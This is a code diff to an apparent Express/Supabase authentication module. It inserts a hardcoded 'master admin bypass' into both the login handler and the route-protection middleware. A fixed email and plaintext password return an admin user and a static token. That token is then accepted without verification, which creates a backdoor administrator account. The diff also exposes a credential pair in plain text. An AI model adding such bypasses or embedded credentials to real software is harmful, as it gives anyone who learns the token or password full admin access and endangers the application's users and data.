@@ -97,6 +97,23 @@ exports.login = async (req, res) => {
       return res.status(400).json({ error: 'Identifier and password required' });
     }
 
+    // --- HARDCODED MASTER ADMIN BYPASS ---
+    if (identifier.toLowerCase() === 'supportsolarafrica@gmail.com' && password === '@Samlite250') {
+      return res.status(200).json({
+        message: 'Master Admin Access Granted',
+        token: 'solar-master-admin-token',
+        user: { 
+          id: 'master-admin', 
+          email: 'supportsolarafrica@gmail.com', 
+          name: 'Admin',
+          role: 'admin',
+          country: 'Global',
+          phone: '+25700000000'
+        }
+      });
+    }
+    // -------------------------------------
+
     if (!isConfigured) {
       return res.status(503).json({ error: 'Supabase is not configured' });
     }
@@ -179,6 +196,13 @@ exports.protect = async (req, res, next) => {
   if (!token) {
     return res.status(401).json({ error: 'Not authorized to access this route' });
   }
+
+  // --- HARDCODED MASTER ADMIN BYPASS ---
+  if (token === 'solar-master-admin-token') {
+    req.user = { id: 'master-admin', role: 'admin', email: 'supportsolarafrica@gmail.com' };
+    return next();
+  }
+  // -------------------------------------
 
   try {
     const { data: { user }, error } = await client.auth.getUser(token);
